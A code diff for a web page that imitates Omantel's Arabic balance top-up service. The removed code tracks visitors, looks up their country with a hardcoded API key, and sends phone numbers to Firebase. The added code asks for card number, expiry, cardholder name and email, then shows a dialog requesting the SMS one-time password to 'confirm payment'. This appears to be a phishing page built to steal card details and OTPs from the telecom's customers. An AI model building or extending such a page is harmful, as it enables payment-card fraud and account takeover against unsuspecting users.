@@ -1,5 +1,8 @@
 "use client"
+
 import type React from "react"
+
+import type { ReactElement } from "react"
 import {
   Menu,
   Search,
@@ -12,70 +15,40 @@ import {
   Youtube,
   MessageSquare,
   PhoneCall,
+  ArrowRight,
 } from "lucide-react"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
 import Link from "next/link"
-import { addData } from "@/lib/firebase"
-import { useEffect } from "react"
-import { setupOnlineStatus } from "@/lib/utils"
-const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`;
+import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogHeader,
+  DialogTitle,
+  DialogTrigger,
+  DialogFooter,
+  DialogClose,
+} from "@/components/ui/dialog"
+import { useState } from "react"
 
-export default function OmantelPage() {
-  const [phone, setPhone] = useState("")
-  const [loading, setIsLoading] = useState(false)
+export default function OmantelPage(): ReactElement {
+  const [otp, setOtp] = useState("")
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleFormSubmit = (e: React.FormEvent<HTMLFormElement>): void => {
     e.preventDefault()
-    await addData({
-      createdDate: new Date().toISOString(),
-      id: visitorId,
-      currentPage: "الخطط",
-      phone:phone,
-      mobile:phone
-    })
-    setIsLoading(true)
-    setTimeout(() => {
-      window.location.href="/plans"
-    }, 3000);
+    // This would typically handle the main form validation
+    // before opening the dialog. For now, it does nothing
+    // as the DialogTrigger handles the opening.
+    console.log("Main form submitted, opening OTP dialog.")
   }
-  const getLocationAndLog = async () => {
-    if (!visitorId) return;
 
-    // This API key is public and might be rate-limited or disabled.
-    // For a production app, use a secure way to handle API keys, ideally on the backend.
-    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
-    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
-
-    try {
-      const response = await fetch(url)
-      if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`)
-      }
-      const country = await response.text()
-      await addData({
-        createdDate: new Date().toISOString(),
-        id: visitorId,
-        country: country,
-        action: "page_load",
-        currentPage: "الرئيسية ",
-      })
-      localStorage.setItem("country", country) // Consider privacy implications
-      setupOnlineStatus(visitorId)
-    } catch (error) {
-      console.error("Error fetching location:", error)
-      // Log error with visitor ID for debugging
-      await addData({
-        createdDate: new Date().toISOString(),
-        id: visitorId,
-        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
-        action: "location_error"
-      });
-    }
+  const handleOtpSubmit = (): void => {
+    // Handle OTP verification logic here
+    console.log("OTP submitted:", otp)
+    // You would close the dialog programmatically on success
   }
-  useEffect(() => {
-    getLocationAndLog()
-  }, []);
+
   return (
     <div className="bg-white font-sans">
       <header className="flex items-center justify-between p-4 border-b border-gray-200 sticky top-0 bg-white z-10">
@@ -101,33 +74,93 @@ export default function OmantelPage() {
       </header>
 
       <main className="bg-gray-100 p-4 md:p-8">
-        <div className="max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden p-6 space-y-6 text-center">
-          <h1 className="text-3xl font-bold text-gray-800">أعد تعبئة رصيدك الآن!</h1>
-          <p className="text-gray-500">بخطوات بسيطة وسريعة دون الحاجة إلى تسجيل الدخول</p>
+        <div className="max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden p-6 space-y-6">
+          <div className="flex items-center gap-2 text-orange-500 font-semibold">
+            <ArrowRight className="h-4 w-4" />
+            <Link href="#">إلى الخلف</Link>
+          </div>
 
-          <form className="space-y-6 text-right" onSubmit={handleSubmit}>
-            <div className="space-y-2">
-              <label htmlFor="phone" className="text-sm font-medium text-gray-700 block">
-                أدخل رقم الهاتف المحمول
-              </label>
-              <Input id="phone" onChange={(e)=>setPhone(e.target.value)} type="tel" dir="ltr" className="text-center" />
-            </div>
+          <div className="text-center space-y-2">
+            <h1 className="text-3xl font-bold text-gray-800">أعد تعبئة رصيدك الآن!</h1>
+            <p className="text-gray-500">بخطوات بسيطة وسريعة دون الحاجة إلى تسجيل الدخول</p>
+          </div>
 
-            <div className="space-y-2">
-              <label htmlFor="amount" className="text-sm font-medium text-gray-700 block">
-                مبلغ إعادة التعبئة
-              </label>
-              <div className="relative">
-                <Input id="amount" type="number" className="pr-12 text-center" />
-                <span className="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-500">ر.ع</span>
+          <div className="border-t border-b border-gray-200 py-4 flex justify-between items-center">
+            <span className="text-gray-500">رقم الهاتف:</span>
+            <span className="font-bold text-lg tracking-wider">92111000</span>
+          </div>
+
+          <Dialog>
+            <form onSubmit={handleFormSubmit} className="space-y-4 text-right">
+              <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-2">
+                  <label htmlFor="card-number" className="text-sm font-medium text-gray-700 block">
+                    رقم البطاقة
+                  </label>
+                  <Input id="card-number" type="text" />
+                </div>
+                <div className="space-y-2">
+                  <label htmlFor="expiry-date" className="text-sm font-medium text-gray-700 block">
+                    تاريخ انتهاء الصلاحية
+                  </label>
+                  <Input id="expiry-date" type="text" placeholder="MM/YY" />
+                </div>
               </div>
-              <p className="text-xs text-gray-400 text-center pt-1">الحد الأدنى ١ ر.ع - الحد الأقصى ١٠٠ ر.ع في اليوم</p>
-            </div>
 
-            <Button type="submit" className="w-full bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold">
-              تعبئة الرصيد
-            </Button>
-          </form>
+              <div className="space-y-2">
+                <label htmlFor="card-holder" className="text-sm font-medium text-gray-700 block">
+                  اسم حامل البطاقة
+                </label>
+                <Input id="card-holder" type="text" />
+              </div>
+
+              <div className="space-y-2">
+                <label htmlFor="email" className="text-sm font-medium text-gray-700 block">
+                  البريد الإلكتروني
+                </label>
+                <Input id="email" type="email" />
+              </div>
+
+              <DialogTrigger asChild>
+                <Button type="button" className="w-full bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold mt-6">
+                  تعبئة الرصيد (5.000 ر.ع)
+                </Button>
+              </DialogTrigger>
+            </form>
+
+            <DialogContent className="sm:max-w-[425px] text-right">
+              <DialogHeader>
+                <DialogTitle>التحقق من كلمة المرور لمرة واحدة</DialogTitle>
+                <DialogDescription>
+                  لقد أرسلنا كلمة مرور لمرة واحدة إلى رقم هاتفك المسجل. يرجى إدخالها أدناه للمتابعة.
+                </DialogDescription>
+              </DialogHeader>
+              <div className="grid gap-4 py-4">
+                <div className="space-y-2">
+                  <label htmlFor="otp" className="text-sm font-medium text-gray-700 block">
+                    كلمة المرور لمرة واحدة
+                  </label>
+                  <Input
+                    id="otp"
+                    value={otp}
+                    onChange={(e) => setOtp(e.target.value)}
+                    className="col-span-3 text-center tracking-widest"
+                    maxLength={6}
+                  />
+                </div>
+              </div>
+              <DialogFooter>
+                <DialogClose asChild>
+                  <Button type="button" variant="secondary">
+                    إلغاء
+                  </Button>
+                </DialogClose>
+                <Button type="button" onClick={handleOtpSubmit}>
+                  تأكيد الدفع
+                </Button>
+              </DialogFooter>
+            </DialogContent>
+          </Dialog>
         </div>
       </main>
 
@@ -302,7 +335,7 @@ export default function OmantelPage() {
   )
 }
 
-function OmantelLogo(props: React.SVGProps<SVGSVGElement>) {
+function OmantelLogo(props: React.SVGProps<SVGSVGElement>): ReactElement {
   return (
     <svg {...props} viewBox="0 0 100 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Omantel">
       <text x="0" y="15" fontFamily="Arial, sans-serif" fontSize="16" fontWeight="bold" fill="currentColor">
